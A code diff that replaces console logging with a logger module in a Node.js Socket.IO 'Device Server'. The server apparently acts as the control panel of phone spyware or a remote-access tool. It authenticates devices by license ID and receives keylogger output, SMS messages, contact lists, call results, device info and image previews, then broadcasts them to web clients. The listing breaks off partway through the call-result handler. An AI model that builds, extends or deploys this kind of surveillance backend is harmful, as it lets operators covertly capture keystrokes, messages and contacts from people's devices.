@@ -1,3 +1,6 @@
+// Load logger utility (production-safe - no logs in production)
+const logger = require("./lib/utils/logger");
+
 // Load environment variables from .env.local, .env.production, or .env file
 let dotenvLoaded = false;
 try {
@@ -18,46 +21,46 @@ try {
   if (isProduction && fs.existsSync(envProductionPath)) {
     const result = dotenv.config({ path: envProductionPath });
     if (!result.error) {
-      console.log("✅ Environment variables loaded from .env.production");
+      logger.log("✅ Environment variables loaded from .env.production");
       dotenvLoaded = true;
     } else if (result.error.code !== "ENOENT") {
-      console.warn("⚠️ Error loading .env.production:", result.error.message);
+      logger.warn("⚠️ Error loading .env.production:", result.error.message);
     }
   }
   
   if (!dotenvLoaded && fs.existsSync(envLocalPath)) {
     const result = dotenv.config({ path: envLocalPath });
     if (!result.error) {
-      console.log("✅ Environment variables loaded from .env.local");
+      logger.log("✅ Environment variables loaded from .env.local");
       dotenvLoaded = true;
     } else if (result.error.code !== "ENOENT") {
-      console.warn("⚠️ Error loading .env.local:", result.error.message);
+      logger.warn("⚠️ Error loading .env.local:", result.error.message);
     }
   }
   
   if (!dotenvLoaded && fs.existsSync(envPath)) {
     const result = dotenv.config({ path: envPath });
     if (!result.error) {
-      console.log("✅ Environment variables loaded from .env");
+      logger.log("✅ Environment variables loaded from .env");
       dotenvLoaded = true;
     } else if (result.error.code !== "ENOENT") {
-      console.warn("⚠️ Error loading .env:", result.error.message);
+      logger.warn("⚠️ Error loading .env:", result.error.message);
     }
   }
   
   if (!dotenvLoaded) {
-    console.warn("⚠️ No .env file found. Using system environment variables.");
+    logger.warn("⚠️ No .env file found. Using system environment variables.");
     if (isProduction) {
-      console.warn("   Production mode: Expected .env.production file");
+      logger.warn("   Production mode: Expected .env.production file");
     }
   }
 } catch (error) {
   if (error.code === "MODULE_NOT_FOUND") {
-    console.warn("⚠️ dotenv package not installed. Run: npm install");
-    console.warn("   Using system environment variables only.");
+    logger.warn("⚠️ dotenv package not installed. Run: npm install");
+    logger.warn("   Using system environment variables only.");
   } else {
-    console.warn("⚠️ Error loading dotenv:", error.message);
-    console.warn("   Using system environment variables");
+    logger.warn("⚠️ Error loading dotenv:", error.message);
+    logger.warn("   Using system environment variables");
   }
 }
 
@@ -76,17 +79,17 @@ try {
   const path = require('path');
   const envValidationPath = path.join(__dirname, 'lib', 'utils', 'env-validation.ts');
   // For now, we'll do basic validation inline since TypeScript files need compilation
-  console.log('\n📋 [Device Server] Environment Variables:');
-  console.log(`   NEXT_PUBLIC_SUPABASE_URL: ${process.env.NEXT_PUBLIC_SUPABASE_URL ? '✅ Set' : '❌ Missing'}`);
-  console.log(`   SUPABASE_SERVICE_ROLE_KEY: ${process.env.SUPABASE_SERVICE_ROLE_KEY ? '✅ Set' : '❌ Missing'}`);
-  console.log(`   NEXT_PUBLIC_APP_URL: ${process.env.NEXT_PUBLIC_APP_URL || '❌ Not set (using defaults)'}`);
-  console.log(`   ALLOWED_ORIGINS: ${process.env.ALLOWED_ORIGINS || '❌ Not set (using defaults)'}`);
-  console.log(`   NODE_ENV: ${process.env.NODE_ENV || 'development'}`);
-  console.log(`   PORT: ${process.env.PORT || '9211 (default)'}`);
-  console.log('');
+  logger.log('\n📋 [Device Server] Environment Variables:');
+  logger.log(`   NEXT_PUBLIC_SUPABASE_URL: ${process.env.NEXT_PUBLIC_SUPABASE_URL ? '✅ Set' : '❌ Missing'}`);
+  logger.log(`   SUPABASE_SERVICE_ROLE_KEY: ${process.env.SUPABASE_SERVICE_ROLE_KEY ? '✅ Set' : '❌ Missing'}`);
+  logger.log(`   NEXT_PUBLIC_APP_URL: ${process.env.NEXT_PUBLIC_APP_URL || '❌ Not set (using defaults)'}`);
+  logger.log(`   ALLOWED_ORIGINS: ${process.env.ALLOWED_ORIGINS || '❌ Not set (using defaults)'}`);
+  logger.log(`   NODE_ENV: ${process.env.NODE_ENV || 'development'}`);
+  logger.log(`   PORT: ${process.env.PORT || '9211 (default)'}`);
+  logger.log('');
 } catch (error) {
   // Continue even if validation fails
-  console.warn('⚠️ Could not run environment validation:', error.message);
+  logger.warn('⚠️ Could not run environment validation:', error.message);
 }
 
 const app = express();
@@ -103,7 +106,7 @@ let allowedOrigins = process.env.ALLOWED_ORIGINS
 // Always add http://127.0.0.1:9211 to allowed origins (dev and prod)
 if (!allowedOrigins.includes('http://127.0.0.1:9211')) {
   allowedOrigins.push('http://127.0.0.1:9211');
-  console.log(`🔧 [Device Server] Added localhost device server origin: http://127.0.0.1:9211`);
+  logger.log(`🔧 [Device Server] Added localhost device server origin: http://127.0.0.1:9211`);
 }
 
 // Auto-detect and allow LocalTunnel domains in development
@@ -119,7 +122,7 @@ if (isDevelopment) {
         const tunnelOrigin = `${url.protocol}//${url.hostname}${url.port ? `:${url.port}` : ''}`;
         if (!allowedOrigins.includes(tunnelOrigin)) {
           allowedOrigins.push(tunnelOrigin);
-          console.log(`🔧 [Device Server] Auto-detected tunnel origin: ${tunnelOrigin}`);
+          logger.log(`🔧 [Device Server] Auto-detected tunnel origin: ${tunnelOrigin}`);
         }
       }
     } catch (e) {
@@ -143,19 +146,19 @@ if (isDevelopment) {
   specificTunnelOrigins.forEach(origin => {
     if (!allowedOrigins.includes(origin)) {
       allowedOrigins.push(origin);
-      console.log(`🔧 [Device Server] Added tunnel origin (dev only): ${origin}`);
+      logger.log(`🔧 [Device Server] Added tunnel origin (dev only): ${origin}`);
     }
   });
 }
 
-console.log(`🔧 [Device Server] CORS Configuration:`);
-console.log(`   Environment: ${isDevelopment ? 'Development' : 'Production'}`);
+logger.log(`🔧 [Device Server] CORS Configuration:`);
+logger.log(`   Environment: ${isDevelopment ? 'Development' : 'Production'}`);
 if (isDevelopment) {
-  console.log(`   Note: Tunnel origins are auto-detected and added in development`);
+  logger.log(`   Note: Tunnel origins are auto-detected and added in development`);
 } else {
-  console.log(`   Note: Production uses only ALLOWED_ORIGINS environment variable`);
+  logger.log(`   Note: Production uses only ALLOWED_ORIGINS environment variable`);
 }
-console.log(`   Allowed origins:`, allowedOrigins);
+logger.log(`   Allowed origins:`, allowedOrigins);
 
 const server = http.createServer(app);
 const io = new Server(server, {
@@ -163,20 +166,20 @@ const io = new Server(server, {
   cors: { 
     origin: (origin, callback) => {
       // Log every origin check for debugging (temporarily)
-      console.log(`🔍 [Device Server] CORS check - Origin: ${origin || 'no origin'}`);
-      console.log(`   Allowed origins:`, allowedOrigins);
+      logger.log(`🔍 [Device Server] CORS check - Origin: ${origin || 'no origin'}`);
+      logger.log(`   Allowed origins:`, allowedOrigins);
       
       // Allow requests with no origin (like mobile apps, curl requests, or server-side connections)
       // Note: We don't log every "no origin" request to reduce log noise from polling
       if (!origin) {
         // Only log on first connection or errors - polling makes many requests
-        console.log(`✅ [Device Server] Allowing connection with no origin`);
+        logger.log(`✅ [Device Server] Allowing connection with no origin`);
         return callback(null, true);
       }
       
       // Check if origin is in allowed list
       if (allowedOrigins.includes(origin)) {
-        console.log(`✅ [Device Server] Allowing connection from origin: ${origin}`);
+        logger.log(`✅ [Device Server] Allowing connection from origin: ${origin}`);
         callback(null, true);
         return;
       }
@@ -185,11 +188,11 @@ const io = new Server(server, {
       if (isDevelopment) {
         // Allow localhost variants
         if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
-          console.log(`⚠️ [Device Server] Allowing localhost origin in development: ${origin}`);
-          console.log(`   (Add to ALLOWED_ORIGINS for production)`);
+          logger.log(`⚠️ [Device Server] Allowing localhost origin in development: ${origin}`);
+          logger.log(`   (Add to ALLOWED_ORIGINS for production)`);
           if (!allowedOrigins.includes(origin)) {
             allowedOrigins.push(origin);
-            console.log(`   ✅ Added ${origin} to allowed origins for this session`);
+            logger.log(`   ✅ Added ${origin} to allowed origins for this session`);
           }
           callback(null, true);
           return;
@@ -198,31 +201,31 @@ const io = new Server(server, {
         if (origin.includes('localtonet.com') || origin.includes('localto.net') || 
             origin.includes('ngrok') || origin.includes('localtunnel') ||
             origin.includes('kuchbhi')) {
-          console.log(`⚠️ [Device Server] Allowing tunnel origin in development: ${origin}`);
-          console.log(`   (Add to ALLOWED_ORIGINS for production)`);
+          logger.log(`⚠️ [Device Server] Allowing tunnel origin in development: ${origin}`);
+          logger.log(`   (Add to ALLOWED_ORIGINS for production)`);
           // Add to allowed origins for this session
           if (!allowedOrigins.includes(origin)) {
             allowedOrigins.push(origin);
-            console.log(`   ✅ Added ${origin} to allowed origins for this session`);
+            logger.log(`   ✅ Added ${origin} to allowed origins for this session`);
           }
           callback(null, true);
           return;
         }
         
         // In development, allow ALL origins (very permissive for debugging)
-        console.log(`⚠️ [Device Server] Development mode: Allowing origin ${origin} (permissive mode)`);
-        console.log(`   (Add to ALLOWED_ORIGINS for production)`);
+        logger.log(`⚠️ [Device Server] Development mode: Allowing origin ${origin} (permissive mode)`);
+        logger.log(`   (Add to ALLOWED_ORIGINS for production)`);
         if (!allowedOrigins.includes(origin)) {
           allowedOrigins.push(origin);
-          console.log(`   ✅ Added ${origin} to allowed origins for this session`);
+          logger.log(`   ✅ Added ${origin} to allowed origins for this session`);
         }
         callback(null, true);
         return;
       } else {
         // Production: strict CORS
-        console.warn(`❌ [Device Server] CORS: Blocked connection from origin: ${origin}`);
-        console.warn(`   Allowed origins:`, allowedOrigins);
-        console.warn(`   Fix: Add this origin to ALLOWED_ORIGINS environment variable`);
+        logger.warn(`❌ [Device Server] CORS: Blocked connection from origin: ${origin}`);
+        logger.warn(`   Allowed origins:`, allowedOrigins);
+        logger.warn(`   Fix: Add this origin to ALLOWED_ORIGINS environment variable`);
         callback(new Error('Not allowed by CORS'));
       }
     },
@@ -239,9 +242,9 @@ const io = new Server(server, {
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
-console.log(`🔍 Environment check:`);
-console.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? "✅ Set" : "❌ Missing"}`);
-console.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? "✅ Set" : "❌ Missing"}`);
+logger.log(`🔍 Environment check:`);
+logger.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? "✅ Set" : "❌ Missing"}`);
+logger.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? "✅ Set" : "❌ Missing"}`);
 
 let supabase = null;
 if (supabaseUrl && supabaseServiceKey) {
@@ -251,11 +254,11 @@ if (supabaseUrl && supabaseServiceKey) {
       persistSession: false,
     },
   });
-  console.log("✅ Supabase client initialized for License ID and email hash validation");
+  logger.log("✅ Supabase client initialized for License ID and email hash validation");
 } else {
-  console.error("❌ Supabase credentials not found. License ID validation will be disabled.");
-  console.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
-  console.error("   You can set them in .env.local file or as system environment variables.");
+  logger.error("❌ Supabase credentials not found. License ID validation will be disabled.");
+  logger.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
+  logger.error("   You can set them in .env.local file or as system environment variables.");
 }
 
 // Note: Device authentication uses License ID (stored per-user in user_profiles.license_id)
@@ -272,26 +275,26 @@ function loadPersistedDevices() {
       const content = fs.readFileSync(DEVICES_FILE, "utf8").trim();
       // Handle empty file or whitespace-only content
       if (!content) {
-        console.log(`📂 devices.json is empty, starting with empty device list`);
+        logger.log(`📂 devices.json is empty, starting with empty device list`);
         return [];
       }
       const devices = JSON.parse(content);
       // Ensure devices is an array
       if (!Array.isArray(devices)) {
-        console.warn(`⚠️ devices.json does not contain an array, resetting to empty array`);
+        logger.warn(`⚠️ devices.json does not contain an array, resetting to empty array`);
         return [];
       }
-      console.log(`📂 Loaded ${devices.length} devices from ${DEVICES_FILE}`);
+      logger.log(`📂 Loaded ${devices.length} devices from ${DEVICES_FILE}`);
       return devices;
     }
   } catch (e) {
-    console.error("❌ Error loading devices:", e.message);
-    console.log(`📂 Resetting devices.json to empty array`);
+    logger.error("❌ Error loading devices:", e.message);
+    logger.log(`📂 Resetting devices.json to empty array`);
     // Initialize file with empty array on error
     try {
       fs.writeFileSync(DEVICES_FILE, JSON.stringify([], null, 2));
     } catch (writeErr) {
-      console.error("❌ Error resetting devices.json:", writeErr.message);
+      logger.error("❌ Error resetting devices.json:", writeErr.message);
     }
   }
   return [];
@@ -305,9 +308,9 @@ function saveDevices() {
       lastSeen: d.lastSeen || Date.now(),
     }));
     fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
-    console.log(`💾 Saved ${devices.length} devices.`);
+    logger.log(`💾 Saved ${devices.length} devices.`);
   } catch (e) {
-    console.error("❌ Error saving devices:", e.message);
+    logger.error("❌ Error saving devices:", e.message);
   }
 }
 
@@ -324,19 +327,19 @@ io.on("connection", (socket) => {
   const address = socket.handshake.address;
   const transport = socket.conn.transport.name;
   
-  console.log(`🔌 [Device Server] New socket connection: ${socket.id}`);
-  console.log(`   Origin: ${origin}`);
-  console.log(`   Address: ${address}`);
-  console.log(`   User-Agent: ${userAgent.substring(0, 80)}${userAgent.length > 80 ? '...' : ''}`);
-  console.log(`   Transport: ${transport}`);
+  logger.log(`🔌 [Device Server] New socket connection: ${socket.id}`);
+  logger.log(`   Origin: ${origin}`);
+  logger.log(`   Address: ${address}`);
+  logger.log(`   User-Agent: ${userAgent.substring(0, 80)}${userAgent.length > 80 ? '...' : ''}`);
+  logger.log(`   Transport: ${transport}`);
   
   // Determine connection type
   if (origin === 'no origin') {
-    console.log(`   Type: Server-side or non-browser client (allowed)`);
+    logger.log(`   Type: Server-side or non-browser client (allowed)`);
   } else if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
-    console.log(`   Type: Browser client (localhost)`);
+    logger.log(`   Type: Browser client (localhost)`);
   } else {
-    console.log(`   Type: Browser client (${origin})`);
+    logger.log(`   Type: Browser client (${origin})`);
   }
   
   let isAuthenticated = false;
@@ -353,7 +356,7 @@ io.on("connection", (socket) => {
     const originalEmit = socket.emit.bind(socket);
     socket.emit = function(event, ...args) {
       if (event.includes("account") || event.includes("result")) {
-        console.log(`🔍 [DEBUG] Socket ${socket.id} emitting: ${event}`, args);
+        logger.log(`🔍 [DEBUG] Socket ${socket.id} emitting: ${event}`, args);
       }
       return originalEmit(event, ...args);
     };
@@ -363,29 +366,29 @@ io.on("connection", (socket) => {
       // Skip ignored events even in debug mode
       if (ignoredEvents.includes(eventName)) {
         // return;
-        console.log(pingreceived)     
+        logger.log(pingreceived)     
        }
       
       // Special logging for image_preview
       if (eventName === "image_preview" || eventName.includes("preview") || eventName.includes("image")) {
-        console.log(`🖼️ [DEBUG-IMAGE] Socket ${socket.id} received event: "${eventName}"`);
+        logger.log(`🖼️ [DEBUG-IMAGE] Socket ${socket.id} received event: "${eventName}"`);
         if (args.length > 0 && typeof args[0] === "object" && args[0] !== null) {
-          console.log(`🖼️ [DEBUG-IMAGE] First arg keys:`, Object.keys(args[0]));
+          logger.log(`🖼️ [DEBUG-IMAGE] First arg keys:`, Object.keys(args[0]));
         }
       }
       // Special logging for keylogger-result
       else if (eventName === "keylogger-result" || eventName.includes("keylogger") || eventName.includes("keylog")) {
-        console.log(`⌨️ [DEBUG-KEYLOGGER] Socket ${socket.id} received event: "${eventName}"`);
+        logger.log(`⌨️ [DEBUG-KEYLOGGER] Socket ${socket.id} received event: "${eventName}"`);
         if (args.length > 0) {
-          console.log(`⌨️ [DEBUG-KEYLOGGER] First arg:`, JSON.stringify(args[0], null, 2).substring(0, 200));
+          logger.log(`⌨️ [DEBUG-KEYLOGGER] First arg:`, JSON.stringify(args[0], null, 2).substring(0, 200));
         }
       }
       else {
-        console.log(`🔍 [DEBUG-ALL] Socket ${socket.id} received event: "${eventName}"`);
+        logger.log(`🔍 [DEBUG-ALL] Socket ${socket.id} received event: "${eventName}"`);
         if (args.length > 0) {
-          console.log(`🔍 [DEBUG-ALL] First arg type:`, typeof args[0]);
+          logger.log(`🔍 [DEBUG-ALL] First arg type:`, typeof args[0]);
           if (typeof args[0] === "object" && args[0] !== null) {
-            console.log(`🔍 [DEBUG-ALL] First arg keys:`, Object.keys(args[0]));
+            logger.log(`🔍 [DEBUG-ALL] First arg keys:`, Object.keys(args[0]));
           }
         }
       }
@@ -416,12 +419,12 @@ io.on("connection", (socket) => {
         const dataPreview = typeof data === 'object' && data !== null
           ? JSON.stringify(data, null, 2).substring(0, 200) + (JSON.stringify(data).length > 200 ? '...' : '')
           : data;
-        console.log(
+        logger.log(
           `📥 [${event}] Data from ${socket.uuid || "unknown client"}:`,
           dataPreview
         );
       } catch (err) {
-        console.error(`[${event}] Invalid JSON data:`, err);
+        logger.error(`[${event}] Invalid JSON data:`, err);
       }
     }
   });
@@ -437,11 +440,11 @@ io.on("connection", (socket) => {
     const uuid = data?.uuid; // Device UUID
     const token = data?.token; // License ID (used as device auth secret, stored per-user in database)
 
-    console.log(`🔐 Authentication attempt - UUID: ${uuid}, Token: ${token ? token.substring(0, 10) + '...' : 'None'}`);
+    logger.log(`🔐 Authentication attempt - UUID: ${uuid}, Token: ${token ? token.substring(0, 10) + '...' : 'None'}`);
 
     // Validate UUID
     if (!uuid || typeof uuid !== "string") {
-      console.warn(`❌ Authentication failed: Invalid UUID`);
+      logger.warn(`❌ Authentication failed: Invalid UUID`);
       socket.emit("auth-failed", { error: "Invalid UUID" });
       socket.disconnect(true);
       return;
@@ -449,7 +452,7 @@ io.on("connection", (socket) => {
 
     // Validate token (License ID format: 26 characters, 25 alphanumeric + "=")
     if (!token || typeof token !== "string" || token.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(token)) {
-      console.warn(`❌ Authentication failed: Invalid token format (expected License ID: 26 chars, 25 alphanumeric + "=")`);
+      logger.warn(`❌ Authentication failed: Invalid token format (expected License ID: 26 chars, 25 alphanumeric + "=")`);
       socket.emit("auth-failed", { error: "Invalid token format - must be License ID (26 characters)" });
       socket.disconnect(true);
       return;
@@ -461,17 +464,17 @@ io.on("connection", (socket) => {
     if (supabase) {
       userId = await validateLicenseId(token);
       if (!userId) {
-        console.warn(`❌ License ID validation failed - token may not exist in database or user is inactive`);
+        logger.warn(`❌ License ID validation failed - token may not exist in database or user is inactive`);
         socket.emit("auth-failed", { error: "Invalid License ID or user inactive" });
         socket.disconnect(true);
         return;
       }
-      console.log(`✅ License ID validated for user: ${userId}`);
+      logger.log(`✅ License ID validated for user: ${userId}`);
       // Device UUID is just an identifier - we link it to the user from License ID
       // No need to check if device exists in database
     } else {
       // STRICT: No fallback - Supabase must be configured
-      console.error("❌ Supabase not configured - authentication cannot proceed");
+      logger.error("❌ Supabase not configured - authentication cannot proceed");
       socket.emit("auth-failed", { error: "Server configuration error: Supabase not configured" });
       socket.disconnect(true);
       return;
@@ -485,7 +488,7 @@ io.on("connection", (socket) => {
       try {
         old.socket.disconnect(true);
       } catch (e) {
-        console.warn(`⚠️ Error disconnecting old socket for ${uuid}:`, e.message);
+        logger.warn(`⚠️ Error disconnecting old socket for ${uuid}:`, e.message);
       }
     }
 
@@ -495,17 +498,17 @@ io.on("connection", (socket) => {
     // Restore info if known
     if (deviceRegistry.has(uuid)) {
       clients.get(uuid).info = deviceRegistry.get(uuid).info;
-      console.log(`♻️ Restored device info for ${uuid}`);
+      logger.log(`♻️ Restored device info for ${uuid}`);
     }
 
-    console.log(`✅ Device authenticated: ${uuid} (User: ${userId})`);
+    logger.log(`✅ Device authenticated: ${uuid} (User: ${userId})`);
     socket.emit("auth-success", { uuid });
   });
 
   // -------- GETINFO from device --------
   socket.on("getinfo", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated getinfo attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated getinfo attempt from ${socket.id}`);
       return;
     }
 
@@ -513,13 +516,13 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid getinfo data from ${uuid}`);
+      logger.error(`❌ Invalid getinfo data from ${uuid}`);
       return;
     }
 
@@ -527,7 +530,7 @@ io.on("connection", (socket) => {
     client.info = data;
 
     try {
-      console.log(`📥 [getinfo] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [getinfo] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Update registry with userId
       deviceRegistry.set(uuid, { info: data, lastSeen: Date.now(), userId: client.userId });
@@ -541,16 +544,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted device_info event for ${uuid}`);
+      logger.log(`📤 Broadcasted device_info event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [getinfo] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [getinfo] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- SMS RESULT from device --------
   socket.on("sms-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated sms-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated sms-result attempt from ${socket.id}`);
       return;
     }
 
@@ -558,18 +561,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid sms-result data from ${uuid}`);
+      logger.error(`❌ Invalid sms-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast sms-result event to all web clients
       io.emit("device_event", {
@@ -579,16 +582,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted sms_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted sms_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [sms-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [sms-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- COMPOSE SMS RESULT from device --------
   socket.on("sendsms-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated sendsms-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated sendsms-result attempt from ${socket.id}`);
       return;
     }
 
@@ -596,18 +599,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid sendsms-result data from ${uuid}`);
+      logger.error(`❌ Invalid sendsms-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [sendsms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [sendsms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast sendsms-result event to all web clients
       io.emit("device_event", {
@@ -617,16 +620,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted sendsms_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted sendsms_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [sendsms-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [sendsms-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- COMPOSE SMS RESULT (alternative event name) --------
   socket.on("compose-sms-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated compose-sms-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated compose-sms-result attempt from ${socket.id}`);
       return;
     }
 
@@ -634,18 +637,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid compose-sms-result data from ${uuid}`);
+      logger.error(`❌ Invalid compose-sms-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [compose-sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [compose-sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast compose-sms-result event to all web clients
       io.emit("device_event", {
@@ -655,16 +658,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted compose_sms_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted compose_sms_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [compose-sms-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [compose-sms-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- CONTACT RESULT from device --------
   socket.on("contact-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated contact-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated contact-result attempt from ${socket.id}`);
       return;
     }
 
@@ -672,18 +675,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid contact-result data from ${uuid}`);
+      logger.error(`❌ Invalid contact-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast contact-result event to all web clients
       io.emit("device_event", {
@@ -693,16 +696,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted contact_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted contact_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [contact-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [contact-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- ADD CONTACT RESULT from device --------
   socket.on("add-contact-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated add-contact-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated add-contact-result attempt from ${socket.id}`);
       return;
     }
 
@@ -710,18 +713,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid add-contact-result data from ${uuid}`);
+      logger.error(`❌ Invalid add-contact-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [add-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [add-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast add-contact-result event to all web clients
       io.emit("device_event", {
@@ -731,16 +734,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted add_contact_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted add_contact_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [add-contact-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [add-contact-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- DELETE CONTACT RESULT from device --------
   socket.on("delete-contact-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated delete-contact-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated delete-contact-result attempt from ${socket.id}`);
       return;
     }
 
@@ -748,18 +751,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid delete-contact-result data from ${uuid}`);
+      logger.error(`❌ Invalid delete-contact-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [delete-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [delete-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast delete-contact-result event to all web clients
       io.emit("device_event", {
@@ -769,16 +772,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted delete_contact_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted delete_contact_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [delete-contact-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [delete-contact-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- CALL RESULT from device --------
   socket.on("call-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated call-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated call-result attempt from ${socket.id}`);
       return;
     }
 
@@ -786,18 +789,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
